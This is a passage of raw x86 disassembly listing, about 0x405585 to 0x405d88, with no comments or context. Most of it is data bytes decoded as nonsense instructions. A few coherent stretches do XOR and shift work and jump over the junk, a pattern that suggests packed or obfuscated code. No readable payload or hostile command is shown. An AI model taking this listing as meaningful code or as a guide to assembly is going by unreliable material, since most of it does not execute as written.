  405585:	or     ah,BYTE PTR [eax-0x30]
  405588:	ja     0x40552b
  40558a:	xchg   edx,eax
  40558b:	add    DWORD PTR [esi],edx
  40558d:	jns    0x405525
  40558f:	sbb    al,0x1a
  405591:	jb     0x405604
  405593:	clc    
  405594:	pushf  
  405595:	dec    edi
  405596:	dec    edi
  405597:	stos   DWORD PTR es:[edi],eax
  405598:	mov    ebx,0x76e89caa
  40559d:	sahf   
  40559e:	hlt    
  40559f:	add    eax,eax
  4055a1:	dec    ecx
  4055a2:	inc    ebp
  4055a3:	add    eax,0x9f8702b7
  4055a8:	fs gs sti 
  4055ab:	pop    eax
  4055ac:	xlat   BYTE PTR ds:[ebx]
  4055ad:	repz les ebx,FWORD PTR [ebp+0x3d]
  4055b1:	jg     0x4055a1
  4055b3:	mov    eax,ds:0x755b3171
  4055b8:	push   es
  4055b9:	xchg   ebp,eax
  4055ba:	(bad)  
  4055bb:	ins    DWORD PTR es:[edi],dx
  4055bc:	cdq    
  4055bd:	sub    eax,0xf9716763
  4055c2:	jno    0x4055ad
  4055c4:	in     al,dx
  4055c5:	add    al,0xaf
  4055c7:	setg   cl
  4055ca:	mov    ds:0x4cfe2e37,al
  4055cf:	mov    eax,0xc90ea9e2
  4055d4:	lods   eax,DWORD PTR ds:[esi]
  4055d5:	inc    eax
  4055d6:	add    BYTE PTR [edi+0x5baefbe4],dh
  4055dc:	jle    0x405598
  4055de:	mov    fs,WORD PTR [ebx+0x62]
  4055e1:	cmp    BYTE PTR [ecx],ah
  4055e3:	ins    BYTE PTR es:[edi],dx
  4055e4:	mov    WORD PTR [edx+0x4f],gs
  4055e7:	ds inc ebx
  4055e9:	mov    esp,0x2dfb8704
  4055ee:	ins    DWORD PTR es:[edi],dx
  4055ef:	or     bh,dh
  4055f1:	int    0x94
  4055f3:	dec    edx
  4055f4:	cmp    bh,cl
  4055f6:	js     0x40561a
  4055f8:	mov    dl,0xfb
  4055fa:	push   ebp
  4055fb:	fwait
  4055fc:	stos   DWORD PTR es:[edi],eax
  4055fd:	cmp    dh,bh
  4055ff:	adc    DWORD PTR [ecx],eax
  405601:	jbe    0x40567d
  405603:	bound  ecx,QWORD PTR [ecx]
  405605:	iret   
  405606:	je     0x40558a
  405608:	adc    al,0xe1
  40560a:	xor    esp,DWORD PTR [ebx+0x71]
  40560d:	or     edx,edx
  40560f:	dec    ecx
  405610:	rol    DWORD PTR [eax-0x52],1
  405613:	scas   al,BYTE PTR es:[edi]
  405614:	je     0x4055bb
  405616:	mov    edx,DWORD PTR [ebp+0x5bab30c8]
  40561c:	cmp    al,0xe4
  40561e:	inc    esp
  40561f:	cld    
  405620:	pop    es
  405621:	push   ds
  405622:	cmp    al,0x5
  405624:	std    
  405625:	push   0xffffffe9
  405627:	icebp  
  405628:	dec    edx
  405629:	retf   0x6fb7
  40562c:	shl    eax,0x34
  40562f:	cmp    bl,al
  405631:	nop
  405632:	loope  0x4055fc
  405634:	sub    BYTE PTR [esi-0x4f399a5e],ah
  40563a:	test   al,0xf7
  40563c:	and    BYTE PTR [esi],ah
  40563e:	in     eax,0xab
  405640:	pop    ss
  405641:	dec    ebp
  405642:	inc    BYTE PTR cs:[eax+0x1d7cf4b6]
  405649:	xchg   esp,eax
  40564a:	cmp    DWORD PTR [ebp+0x52394885],ebp
  405650:	ror    DWORD PTR [esi],1
  405652:	sar    ah,cl
  405654:	jl     0x4055fb
  405656:	push   DWORD PTR [edx-0x21]
  405659:	iret   
  40565a:	pop    ebp
  40565b:	xchg   edi,eax
  40565c:	inc    ebx
  40565d:	inc    ecx
  40565e:	scas   al,BYTE PTR es:[edi]
  40565f:	bound  esp,QWORD PTR [esi+ecx*2-0x23]
  405663:	js     0x4056a3
  405665:	push   es
  405666:	pop    eax
  405667:	cs ds cdq 
  40566a:	arpl   di,sp
  40566c:	scas   al,BYTE PTR es:[edi]
  40566d:	xlat   BYTE PTR ds:[ebx]
  40566e:	jo     0x4056d3
  405670:	daa    
  405671:	and    al,BYTE PTR [edx+0x4f]
  405674:	(bad)  
  405676:	cmp    DWORD PTR [eax],edi
  405678:	enter  0x66d4,0x2d
  40567c:	or     al,0x3e
  40567e:	mov    bh,BYTE PTR [esi+eax*8-0x15d86f0f]
  405685:	adc    BYTE PTR es:[edi+0x345ad85c],dl
  40568c:	jbe    0x40569a
  40568e:	mov    edi,0xb28dac2d
  405693:	pop    es
  405694:	aam    0x5f
  405696:	sbb    al,0xd3
  405698:	jmp    0x85e8:0x2a84fd98
  40569f:	cmp    ecx,ebp
  4056a1:	scas   al,BYTE PTR es:[edi]
  4056a2:	shl    BYTE PTR [eax+ebp*8+0x32e19d7c],0xde
  4056aa:	push   esi
  4056ab:	xor    DWORD PTR [eax-0x48a03d7b],0xadba7118
  4056b5:	adc    ecx,eax
  4056b7:	pop    esi
  4056b8:	test   al,0xd3
  4056ba:	outs   dx,BYTE PTR ds:[esi]
  4056bb:	out    0xbb,al
  4056bd:	(bad)  
  4056bf:	lods   al,BYTE PTR ds:[esi]
  4056c0:	mov    cl,0x36
  4056c2:	pop    ds
  4056c3:	mov    ds:0xd3723b7d,eax
  4056c8:	dec    edi
  4056c9:	mov    DWORD PTR [edx],ebx
  4056cb:	out    0x7a,al
  4056cd:	inc    edx
  4056ce:	jae    0x405665
  4056d0:	inc    ecx
  4056d1:	cmp    DWORD PTR [esi+0x1e162da2],eax
  4056d7:	jecxz  0x405662
  4056d9:	dec    ebp
  4056da:	dec    edi
  4056db:	sbb    edi,DWORD PTR [eax]
  4056dd:	add    eax,0x68d06b4e
  4056e2:	pop    esp
  4056e3:	in     eax,dx
  4056e4:	stos   DWORD PTR es:[edi],eax
  4056e5:	out    dx,eax
  4056e6:	(bad)  
  4056e7:	ds repnz inc edi
  4056ea:	mov    ds:0x8586e544,eax
  4056ef:	sbb    ecx,ecx
  4056f1:	mov    eax,ds:0x33547e8d
  4056f6:	sahf   
  4056f7:	or     BYTE PTR [eax+0x501c7486],ah
  4056fd:	arpl   dx,bx
  4056ff:	add    al,0x11
  405701:	shl    BYTE PTR [edi-0x7ebfe794],1
  405707:	bnd call 0xebcfdf63
  40570d:	in     eax,0xde
  40570f:	jge    0x405709
  405711:	aaa    
  405712:	rcl    DWORD PTR [ebp-0x4ae453c6],cl
  405718:	sub    ch,BYTE PTR [ebp+0x40e0050f]
  40571e:	shr    eax,cl
  405720:	aad    0x88
  405722:	loopne 0x4056b4
  405724:	xor    eax,0x5ce264e8
  405729:	ret    0x7b7d
  40572c:	fadd   DWORD PTR [edx-0x76]
  40572f:	sub    eax,0xd7d844e8
  405734:	addr16 dec ecx
  405736:	jecxz  0x405747
  405738:	arpl   WORD PTR [esi-0x5],bx
  40573b:	mov    ecx,0x4315261c
  405740:	(bad)  
  405741:	fbld   TBYTE PTR [ebp+0x68]
  405744:	ins    BYTE PTR es:[edi],dx
  405745:	mov    cl,BYTE PTR [edx]
  405747:	jecxz  0x40573e
  405749:	test   al,0x99
  40574b:	loop   0x405700
  40574d:	fstp   QWORD PTR [eax]
  40574f:	or     DWORD PTR [eax+eax*2],0xd3ee770c
  405756:	mov    al,0xf6
  405758:	add    eax,0xeb461af3
  40575d:	push   edi
  40575e:	in     al,dx
  40575f:	lea    edx,[ebp+eax*1+0x692b0da7]
  405766:	sbb    eax,0xad2ed777
  40576b:	mov    ?,WORD PTR [ebp+0x5583520e]
  405771:	pop    ebx
  405772:	mov    eax,0x5f9bede6
  405777:	jns    0x40572c
  405779:	xor    al,0x78
  40577b:	sub    eax,edi
  40577d:	popf   
  40577e:	iret   
  40577f:	ror    BYTE PTR [edx+0x7e],1
  405782:	pusha  
  405783:	mov    edi,0xb108dbd
  405788:	ds xchg ebp,eax
  40578a:	test   al,0xbc
  40578c:	scas   eax,DWORD PTR es:[edi]
  40578d:	sahf   
  40578e:	pop    ss
  40578f:	pop    eax
  405790:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405791:	(bad)  
  405792:	jecxz  0x405783
  405794:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405795:	(bad)
  405799:	ret    
  40579a:	push   esp
  40579b:	push   0x165891ea
  4057a0:	mov    bh,dh
  4057a2:	es pushf 
  4057a4:	adc    eax,0x7e9230ed
  4057a9:	ret    0xc9af
  4057ac:	and    eax,0x9e074d47
  4057b1:	sbb    esi,DWORD PTR [ecx-0x8]
  4057b4:	lods   al,BYTE PTR ds:[esi]
  4057b5:	dec    edi
  4057b6:	ror    BYTE PTR [ebp+0x32],1
  4057b9:	and    eax,0xbc8d2453
  4057be:	sar    BYTE PTR [edx+0x782b49f7],0x4e
  4057c5:	cmp    ch,BYTE PTR [esi-0x73635351]
  4057cb:	jb     0x4057f2
  4057cd:	mov    ds:0xacb13938,eax
  4057d2:	ret    
  4057d3:	(bad)  [eax-0x2f98f284]
  4057d9:	lds    eax,FWORD PTR [ecx+0x31e15ce6]
  4057df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057e0:	repnz and edi,ebx
  4057e3:	not    DWORD PTR [eax-0x3ba2940f]
  4057e9:	sub    BYTE PTR [edx],dl
  4057eb:	sub    BYTE PTR [esi-0x3ce36fad],ah
  4057f1:	cli    
  4057f2:	ins    DWORD PTR es:[edi],dx
  4057f3:	cmp    al,0x79
  4057f5:	ror    bh,0x79
  4057f8:	pusha  
  4057f9:	iret   
  4057fa:	sbb    al,0x3c
  4057fc:	(bad)  
  4057fd:	cld    
  4057fe:	jb     0x405782
  405800:	shl    bl,0x34
  405803:	add    eax,0x932718e9
  405808:	retf   
  405809:	out    dx,eax
  40580a:	out    0x82,eax
  40580c:	pop    eax
  40580d:	scas   al,BYTE PTR es:[edi]
  40580e:	sbb    BYTE PTR [esi-0x19],bh
  405811:	mov    esp,0xeb68ab67
  405816:	mov    eax,0x11fcf0a6
  40581b:	rcl    DWORD PTR [edi+edx*4-0x4a],cl
  40581f:	xor    bl,BYTE PTR [ebx]
  405821:	mov    edi,DWORD PTR [eax]
  405823:	push   ss
  405824:	jmp    0x4057ae
  405826:	jne    0x405866
  405828:	pop    eax
  405829:	or     edi,DWORD PTR [edi+0x17]
  40582c:	(bad)  
  40582d:	jae    0x4057e6
  40582f:	loope  0x40582b
  405831:	jp     0x40580c
  405833:	nop
  405834:	imul   ebp,DWORD PTR [ecx],0x51
  405837:	fidiv  WORD PTR [edx]
  405839:	dec    BYTE PTR [ebx+0x1df70456]
  40583f:	imul   eax,DWORD PTR [ebx+0x4d890042],0xffffffd4
  405846:	cmp    DWORD PTR ds:0x428157,0x0
  40584d:	mov    DWORD PTR ds:0x428247,0x540
  405857:	mov    ecx,0x427
  40585c:	mov    edx,0x7aa7
  405861:	jmp    0x4058af
  405866:	mov    ecx,0x6abc
  40586b:	mov    DWORD PTR ds:0x428247,0x2ac5
  405875:	cmp    DWORD PTR ds:0x428157,0x0
  40587c:	jb     0x40589d
  405882:	push   0x1050
  405887:	call   DWORD PTR ds:0x428e54
  40588d:	adc    DWORD PTR ds:0x4282eb,edx
  405893:	or     DWORD PTR ds:0x42821b,0x369f
  40589d:	neg    DWORD PTR ds:0x42815b
  4058a3:	sub    DWORD PTR ds:0x42813b,edi
  4058a9:	sub    edx,0xfd0
  4058af:	mov    ecx,DWORD PTR [ebp+0x18]
  4058b2:	mov    edx,DWORD PTR [ebp+0x1c]
  4058b5:	shrd   ecx,edx,0x2
  4058b9:	shr    edx,0x2
  4058bc:	mov    DWORD PTR [ebp-0x1c],ecx
  4058bf:	mov    ecx,DWORD PTR [ebp+0x18]
  4058c2:	mov    edx,DWORD PTR [ebp+0x1c]
  4058c5:	xor    DWORD PTR [ebp-0x1c],edi
  4058c8:	xor    edx,edx
  4058ca:	or     edx,DWORD PTR [ebp-0x1c]
  4058cd:	shl    ecx,0x1e
  4058d0:	add    edx,DWORD PTR [ebp-0x2c]
  4058d3:	add    DWORD PTR [eax],edx
  4058d5:	mov    eax,DWORD PTR [esi]
  4058d7:	mov    ecx,DWORD PTR [esi+0x4]
  4058da:	shrd   eax,ecx,0x2
  4058de:	shr    ecx,0x2
  4058e1:	mov    ecx,DWORD PTR [esi]
  4058e3:	mov    edx,DWORD PTR [esi+0x4]
  4058e6:	xor    eax,edi
  4058e8:	shl    ecx,0x1e
  4058eb:	xor    edx,edx
  4058ed:	or     edx,eax
  4058ef:	mov    DWORD PTR [ebp-0x4],edx
  4058f2:	mov    DWORD PTR [ebp-0x30],0xca79a575
  4058f9:	mov    eax,0x9c1b89e8
  4058fe:	jmp    0x405cdc
  405903:	ret    
  405904:	scas   eax,DWORD PTR es:[edi]
  405905:	sar    ebx,0x9d
  405908:	fcmovb st,st(2)
  40590a:	scas   al,BYTE PTR es:[edi]
  40590b:	mov    dl,0xbd
  40590d:	(bad)  
  40590e:	jl     0x40589f
  405910:	inc    edi
  405911:	xchg   edi,eax
  405912:	mov    esp,0x1818b16d
  405917:	sahf   
  405918:	adc    bl,BYTE PTR [eax]
  40591a:	sbb    BYTE PTR [eax-0x3820ed5d],ch
  405920:	xor    ecx,DWORD PTR [ebx-0x18]
  405923:	test   eax,0xb7bb867c
  405928:	sbb    ch,BYTE PTR [edx+0xa]
  40592b:	add    DWORD PTR [ecx+0x466b43df],esi
  405931:	div    DWORD PTR [eax-0x5f3cc61b]
  405937:	adc    dh,ch
  405939:	cmp    dl,BYTE PTR [ecx-0x68192f18]
  40593f:	stos   BYTE PTR es:[edi],al
  405940:	xor    al,0xe4
  405942:	ins    BYTE PTR es:[edi],dx
  405943:	xor    eax,DWORD PTR [ebx+esi*4+0x6a]
  405947:	pop    esi
  405948:	or     BYTE PTR ds:0x173e208c,dh
  40594e:	jge    0x40590c
  405950:	sti    
  405951:	xchg   ebp,eax
  405952:	shr    DWORD PTR [edx+0x401a1bdc],1
  405958:	xor    edx,DWORD PTR [ebx-0x14]
  40595b:	enter  0x90f5,0x35
  40595f:	inc    esi
  405960:	cmp    cl,dh
  405962:	xchg   esp,eax
  405963:	inc    ebp
  405964:	loop   0x40591d
  405966:	outs   dx,DWORD PTR ds:[esi]
  405967:	shr    cl,cl
  405969:	into   
  40596a:	jle    0x40595f
  40596c:	adc    esi,ecx
  40596e:	inc    eax
  40596f:	xchg   BYTE PTR [esi],bh
  405971:	es repz in eax,dx
  405974:	lea    ebx,[esi+0x2e5fa17d]
  40597a:	push   esi
  40597b:	and    edx,edx
  40597d:	(bad)  
  40597e:	adc    al,0x18
  405980:	xchg   ecx,eax
  405981:	inc    ecx
  405982:	and    eax,0xba7cc7a9
  405987:	mov    esi,0x61bb51f2
  40598c:	gs nop
  40598e:	inc    eax
  40598f:	lods   eax,DWORD PTR ds:[esi]
  405990:	gs retf 
  405992:	add    BYTE PTR [edi],al
  405994:	(bad)  
  405995:	cmp    DWORD PTR [ecx],ecx
  405997:	aad    0x2
  405999:	cwde   
  40599a:	and    dl,BYTE PTR [ebx+0x5f]
  40599d:	popf   
  40599e:	push   es
  40599f:	cmp    edi,DWORD PTR ds:0x899edd4a
  4059a5:	cwde   
  4059a6:	xor    eax,0xea091749
  4059ab:	push   es
  4059ac:	cld    
  4059ad:	inc    ebx
  4059ae:	pop    edi
  4059af:	fild   DWORD PTR [edx+0x78]
  4059b2:	push   esi
  4059b3:	out    0xb1,eax
  4059b5:	sub    bl,BYTE PTR [esp+eax*1+0x6f]
  4059b9:	retf   
  4059ba:	push   edi
  4059bb:	jmp    0x3b944cc9
  4059c0:	rol    esi,0x86
  4059c3:	mov    WORD PTR [ebx],ds
  4059c5:	mov    edx,0xf0fffc99
  4059ca:	cmp    al,0xd8
  4059cc:	je     0x40597c
  4059ce:	xchg   edx,eax
  4059cf:	dec    ebp
  4059d0:	xor    ch,BYTE PTR [esi+ecx*1-0x3f]
  4059d4:	test   DWORD PTR [di+0x62],ecx
  4059d8:	mov    esp,0x878d6839
  4059dd:	sub    DWORD PTR [edx-0x1e90ec03],edx
  4059e3:	cld    
  4059e4:	pop    esi
  4059e5:	xchg   BYTE PTR [ebx+0x26],bl
  4059e8:	into   
  4059e9:	adc    bh,BYTE PTR [eax+0x7c]
  4059ec:	sbb    bl,al
  4059ee:	jne    0x4059a2
  4059f0:	xor    DWORD PTR [eax-0x53],esp
  4059f3:	imul   esi,DWORD PTR [edi],0x23
  4059f6:	mov    eax,0x8b8abf44
  4059fb:	and    BYTE PTR cs:[ebx+0x1b1a3554],bl
  405a02:	stos   DWORD PTR es:[edi],eax
  405a03:	jmp    0xc268f373
  405a08:	loop   0x405a60
  405a0a:	ret    
  405a0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a0c:	mov    ebp,0x1289bedf
  405a11:	pop    esi
  405a12:	adc    eax,edx
  405a14:	dec    esi
  405a15:	rol    DWORD PTR [ecx+0x48aaead4],0x5
  405a1c:	mov    dh,0xcc
  405a1e:	or     eax,DWORD PTR [ecx+0x3c]
  405a21:	adc    esp,DWORD PTR [ebx]
  405a23:	xchg   ecx,eax
  405a24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a25:	je     0x4059c7
  405a27:	enter  0xe6c9,0xb6
  405a2b:	adc    al,0xf2
  405a2d:	(bad)  
  405a2e:	pop    ebx
  405a2f:	popa   
  405a30:	je     0x4059fe
  405a32:	or     eax,DWORD PTR [esi]
  405a34:	sub    ah,BYTE PTR [edi]
  405a36:	mov    al,ds:0x3aeec7c
  405a3b:	push   ds
  405a3c:	packsswb mm5,QWORD PTR [eax-0x63]
  405a40:	cmp    al,0x5f
  405a42:	(bad)  
  405a43:	in     al,dx
  405a44:	adc    eax,0x967a9cbe
  405a49:	enter  0x5233,0xaf
  405a4d:	call   0x9afb:0xab9122a4
  405a54:	mov    ah,0x6d
  405a56:	sub    DWORD PTR [ebp+ebx*8+0x6f],ebx
  405a5a:	adc    DWORD PTR [edi+0x4ed6aa61],eax
  405a60:	lods   al,BYTE PTR ds:[esi]
  405a61:	fisttp QWORD PTR [edx+0x67014b89]
  405a67:	inc    edi
  405a68:	xchg   BYTE PTR [edi+eax*1-0x6b6d7e7b],cl
  405a6f:	mov    dl,0x78
  405a71:	fisub  WORD PTR [ebp+0xb275797]
  405a77:	cld    
  405a78:	call   0xfac49109
  405a7d:	inc    esp
  405a7e:	fistp  QWORD PTR [eax]
  405a80:	cmp    DWORD PTR [eax-0x27],esp
  405a83:	clc    
  405a84:	jle    0x405af9
  405a86:	mov    eax,ds:0xa259aa55
  405a8b:	sbb    dl,BYTE PTR [edi+0x11]
  405a8e:	cld    
  405a8f:	or     DWORD PTR [edi],edx
  405a91:	add    BYTE PTR [eax-0x13],0x35
  405a95:	dec    esp
  405a96:	ror    BYTE PTR [ebx+ebx*1],0xc5
  405a9a:	or     BYTE PTR [ebx],0x53
  405a9d:	loopne 0x405a82
  405a9f:	jmp    0xa117:0x7591bd66
  405aa6:	repz sbb BYTE PTR [ebx-0x75],0xbb
  405aab:	push   esp
  405aac:	nop
  405aad:	cmp    ch,ah
  405aaf:	sub    al,0xc4
  405ab1:	push   esp
  405ab2:	pusha  
  405ab3:	cmp    esi,edi
  405ab5:	(bad)  
  405ab6:	fsubrp st(4),st
  405ab8:	repnz xor BYTE PTR [esi],0xe5
  405abc:	push   ss
  405abd:	mov    ebp,0xe64e6fa3
  405ac2:	pop    ebp
  405ac3:	xchg   edi,eax
  405ac4:	dec    ebp
  405ac5:	sahf   
  405ac6:	dec    ebp
  405ac7:	dec    esp
  405ac8:	mov    al,0xe6
  405aca:	scas   al,BYTE PTR es:[edi]
  405acb:	(bad)  
  405acc:	cmp    al,0x11
  405ace:	js     0x405aed
  405ad0:	cdq    
  405ad1:	dec    edx
  405ad2:	push   esp
  405ad3:	or     al,0xc0
  405ad5:	xor    DWORD PTR [edx],0xffffffc4
  405ad8:	jl     0x405b12
  405ada:	pop    eax
  405adb:	add    ebx,DWORD PTR [edi]
  405add:	imul   edx,DWORD PTR [edx-0x75],0xffffffca
  405ae1:	mov    esp,0xcb1e62f8
  405ae6:	test   eax,0x90e181d6
  405aeb:	ficom  DWORD PTR [ecx+edx*8]
  405aee:	xor    ebp,edi
  405af0:	cdq    
  405af1:	lods   eax,DWORD PTR ds:[esi]
  405af2:	xchg   ecx,eax
  405af3:	mov    ah,0x26
  405af5:	cmp    al,0x91
  405af7:	daa    
  405af8:	pop    eax
  405af9:	and    ah,0xc8
  405afc:	mov    bl,0xd3
  405afe:	stos   DWORD PTR es:[edi],eax
  405aff:	or     ebp,ebp
  405b01:	iret   
  405b02:	fild   WORD PTR [esp+ecx*1+0x27ab2515]
  405b09:	mov    esp,DWORD PTR [edi+esi*1]
  405b0c:	gs jne 0x405b1b
  405b0f:	mov    ds:0x333fbd3e,al
  405b14:	xchg   BYTE PTR [eax+0x44d1f5df],bh
  405b1a:	dec    edi
  405b1b:	jnp    0x405b76
  405b1d:	popa   
  405b1e:	int    0x84
  405b20:	xchg   esi,eax
  405b21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b22:	pop    ss
  405b23:	iret   
  405b24:	mov    WORD PTR [ebx+0x67b52795],ss
  405b2a:	ror    BYTE PTR [edx-0x7cc43969],1
  405b30:	xchg   esi,edx
  405b32:	call   0x504b:0xa01e0f48
  405b39:	xlat   BYTE PTR ds:[ebx]
  405b3a:	icebp  
  405b3b:	mov    ch,0x5e
  405b3d:	dec    edx
  405b3e:	and    DWORD PTR [esi-0x2879dc04],esi
  405b44:	dec    esp
  405b45:	xchg   ebp,eax
  405b46:	pop    esi
  405b47:	sbb    al,0xd0
  405b49:	stos   BYTE PTR es:[edi],al
  405b4a:	lds    eax,FWORD PTR [ecx+0x65]
  405b4d:	test   ebp,ebp
  405b4f:	pusha  
  405b50:	inc    ecx
  405b51:	jmp    0x9d97b9ff
  405b56:	es push cs
  405b58:	lods   eax,DWORD PTR ds:[esi]
  405b59:	sub    eax,DWORD PTR [ecx-0x5b]
  405b5c:	xor    DWORD PTR [eax],ebx
  405b5e:	je     0x405b77
  405b60:	leave  
  405b61:	adc    BYTE PTR [esi-0x3296b265],bh
  405b67:	xor    BYTE PTR [ecx+0x217f29cd],al
  405b6d:	jb     0x405b05
  405b6f:	push   cs
  405b70:	mov    ch,0xe6
  405b72:	pop    esi
  405b73:	cmp    BYTE PTR [eax-0x340595b6],0xcc
  405b7a:	mov    al,ds:0xcd62a097
  405b7f:	jecxz  0x405bc1
  405b81:	scas   eax,DWORD PTR es:[edi]
  405b82:	adc    eax,0xaaea96b7
  405b87:	mov    ebp,0x445de200
  405b8c:	dec    esi
  405b8d:	(bad)  
  405b8e:	frstor [esi]
  405b90:	mov    ?,WORD PTR es:[esi-0x5]
  405b94:	lods   eax,DWORD PTR ds:[esi]
  405b95:	mov    DWORD PTR [eax+0x5b],edx
  405b98:	mov    cl,0x23
  405b9a:	mov    bh,0x85
  405b9c:	ins    DWORD PTR es:[edi],dx
  405b9d:	imul   edx,DWORD PTR [ebp+0x4ac550ce],0x17c40ac1
  405ba7:	cmp    al,0xb7
  405ba9:	jge    0x405b2c
  405bab:	xor    edx,eax
  405bad:	imul   ecx,DWORD PTR [edx-0x62e6bab8],0x39
  405bb4:	gs cld 
  405bb6:	sub    edx,esi
  405bb8:	or     edx,DWORD PTR [esp+edx*1-0x32ecdf23]
  405bbf:	loopne 0x405bd1
  405bc1:	cld    
  405bc2:	sub    DWORD PTR [edx-0x5204151c],ebp
  405bc8:	or     esi,DWORD PTR [ebp+ecx*4-0x4c25084a]
  405bcf:	mov    ds:0xdc71dd47,al
  405bd4:	push   esp
  405bd5:	push   ebx
  405bd6:	and    al,0xa3
  405bd8:	cmc    
  405bd9:	popa   
  405bda:	fdiv   QWORD PTR [ebx+0x334a176f]
  405be1:	jle    0x405bac
  405be3:	add    BYTE PTR [esi],al
  405be5:	dec    edi
  405be6:	mov    eax,DWORD PTR [esi]
  405be8:	mov    edi,0xddd114f1
  405bed:	loop   0x405bee
  405bef:	mov    cl,0xd8
  405bf1:	sub    DWORD PTR [edi+0x2],0x23471bb6
  405bf8:	nop
  405bf9:	clc    
  405bfa:	in     al,0x23
  405bfc:	or     edx,edi
  405bfe:	xor    al,0x0
  405c00:	(bad)  
  405c01:	hlt    
  405c02:	aam    0xf3
  405c04:	call   0x34b1b1f2
  405c09:	fstp   TBYTE PTR [edi]
  405c0b:	gs jmp 0xc919:0x364e
  405c12:	push   0xffffff81
  405c14:	push   eax
  405c15:	out    0xf3,eax
  405c17:	sub    ebx,DWORD PTR [edx]
  405c19:	(bad)  
  405c1a:	pop    esi
  405c1b:	shl    DWORD PTR [esp+ebx*8-0x78],0xae
  405c20:	push   0xffffffe5
  405c22:	test   eax,0x7cbe998f
  405c27:	inc    edx
  405c28:	into   
  405c29:	jecxz  0x405c82
  405c2b:	cmp    al,0x3
  405c2d:	sbb    BYTE PTR [esi-0x1d],ch
  405c30:	rcr    DWORD PTR [edx+0x74],cl
  405c33:	mov    fs,ebx
  405c35:	pop    ds
  405c36:	add    esp,DWORD PTR [edi+0x4f942070]
  405c3c:	pop    esi
  405c3d:	pop    ebp
  405c3e:	out    dx,eax
  405c3f:	jno    0x405c8a
  405c41:	shr    DWORD PTR [ebp+0x69],0x7
  405c45:	lds    eax,FWORD PTR [ecx-0x7a]
  405c48:	aas    
  405c49:	aad    0x5d
  405c4b:	pop    ecx
  405c4c:	fld    QWORD PTR [edi]
  405c4e:	cmp    eax,0x4b5b04f5
  405c53:	das    
  405c54:	push   eax
  405c55:	shl    edx,0xd7
  405c58:	aas    
  405c59:	mov    ebx,0xf1b7c577
  405c5e:	mov    edi,0xc3d1c240
  405c63:	je     0x405bfd
  405c65:	dec    ebp
  405c66:	pop    ebx
  405c67:	(bad)
  405c6a:	js     0x405cae
  405c6c:	and    BYTE PTR [ebp+0x1e],cl
  405c6f:	xor    eax,0xdfd98256
  405c74:	int    0xf1
  405c76:	mov    al,ds:0x86a16991
  405c7b:	mov    dh,0x6f
  405c7d:	jb     0x405c6d
  405c7f:	scas   eax,DWORD PTR es:[edi]
  405c80:	add    al,0x3d
  405c82:	adc    ebp,DWORD PTR es:[eax]
  405c85:	imul   edx,ecx,0xf8c2e7e6
  405c8b:	dec    edx
  405c8c:	push   ds
  405c8d:	add    eax,0x39afa5
  405c92:	sub    bl,bl
  405c94:	push   ebx
  405c95:	cs leave 
  405c97:	nop
  405c98:	add    bl,bl
  405c9a:	adc    eax,0xb7548357
  405ca0:	out    dx,al
  405ca1:	inc    edi
  405ca2:	fnstsw WORD PTR [ecx+0x27]
  405ca5:	sub    edx,eax
  405ca7:	test   eax,0x441a5775
  405cac:	dec    ebx
  405cad:	xor    eax,0xe529f4a5
  405cb2:	push   0x109b0322
  405cb7:	arpl   WORD PTR [ebx+0x1a],dx
  405cba:	adc    eax,0xe63fec5d
  405cbf:	imul   esi,DWORD PTR [ebp-0x5c],0x114917ad
  405cc6:	sar    BYTE PTR [edx-0x28399f73],cl
  405ccc:	or     esp,DWORD PTR gs:[edx]
  405ccf:	sahf   
  405cd0:	mov    BYTE PTR [ecx],bh
  405cd2:	sbb    bl,BYTE PTR [edi+0x3facb8c8]
  405cd8:	dec    edx
  405cd9:	and    ah,BYTE PTR [ebp+0x3f]
  405cdc:	mov    DWORD PTR [ebp-0x2c],eax
  405cdf:	mov    DWORD PTR [ebp-0x20],0xca79a571
  405ce6:	mov    DWORD PTR [ebp-0x1c],eax
  405ce9:	mov    DWORD PTR [ebp-0x10],0xca79a57d
  405cf0:	mov    DWORD PTR [ebp-0xc],eax
  405cf3:	mov    DWORD PTR [ebp-0x60],0xca79a579
  405cfa:	mov    DWORD PTR [ebp-0x5c],eax
  405cfd:	mov    eax,DWORD PTR [ebp-0x30]
  405d00:	mov    ecx,DWORD PTR [ebp-0x2c]
  405d03:	shrd   eax,ecx,0x2
  405d07:	shr    ecx,0x2
  405d0a:	mov    ecx,DWORD PTR [ebp-0x30]
  405d0d:	mov    edx,DWORD PTR [ebp-0x2c]
  405d10:	xor    eax,edi
  405d12:	shl    ecx,0x1e
  405d15:	xor    edx,edx
  405d17:	or     eax,edx
  405d19:	jmp    0x4060f7
  405d1e:	cmp    ebp,DWORD PTR [ecx+0x3e]
  405d21:	lock sbb ch,BYTE PTR [esi+0x62d8231a]
  405d28:	shl    DWORD PTR [eax-0x18],1
  405d2b:	xor    bl,BYTE PTR [edi+0x70]
  405d2e:	repnz test eax,0x129e1818
  405d34:	sbb    BYTE PTR [eax],bl
  405d36:	jle    0x405db1
  405d38:	aaa    
  405d39:	cs inc eax
  405d3b:	pop    edx
  405d3c:	rcl    BYTE PTR [edx+ebx*1+0x2c451390],cl
  405d43:	rcl    BYTE PTR [ebx+0x54],1
  405d46:	fwait
  405d47:	dec    esp
  405d48:	inc    edx
  405d49:	into   
  405d4a:	in     al,0x10
  405d4c:	pushf  
  405d4d:	or     eax,0xe34421a4
  405d52:	jo     0x405d7b
  405d54:	adc    bl,BYTE PTR [ebp-0x4c]
  405d57:	sbb    esp,DWORD PTR ss:[esi+0x22]
  405d5b:	jo     0x405d06
  405d5d:	(bad)  
  405d5e:	or     ebp,edi
  405d60:	pushf  
  405d61:	ds jae 0x405d0e
  405d64:	ret    0xd809
  405d67:	arpl   WORD PTR [eax],sp
  405d69:	jecxz  0x405dc3
  405d6b:	popf   
  405d6c:	jae    0x405d67
  405d6e:	jmp    0xa37da159
  405d73:	sbb    DWORD PTR [eax+esi*1],esi
  405d76:	ret    0x2ebe
  405d79:	cdq    
  405d7a:	fbstp  TBYTE PTR ds:0xa6d0391b
  405d80:	or     edx,DWORD PTR [eax]
  405d82:	fwait
  405d83:	jg     0x405ddd
  405d85:	fdivr  DWORD PTR [ebp+0x23]
  405d88:	mov    al,ds:0x57712c0
